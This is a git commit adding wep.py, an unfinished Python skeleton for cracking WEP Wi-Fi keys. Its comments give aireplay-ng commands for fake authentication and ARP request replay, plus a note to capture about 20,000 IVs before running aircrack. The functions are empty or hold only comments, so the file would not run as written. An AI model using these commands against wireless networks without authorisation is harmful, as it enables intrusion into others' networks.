2c4dd987578f2bb03b56e72dead218678ae3e223
Brandon Gonzalez <me@brandongonzalez.net>
2024-04-07 18:11:44 -0400

    Create wep.py

---
+++ wep.py
@@ -0,0 +1,12 @@
+# fake authentication attack
+# ARP Request Replay Attack
+def fake_auth():
+# aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>
+
+def arp_replay_attack():
+# aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>
+# capture like 20000 IV's
+  
+# Crack WEP key with aircrack
+def crack_wep():
+  pass
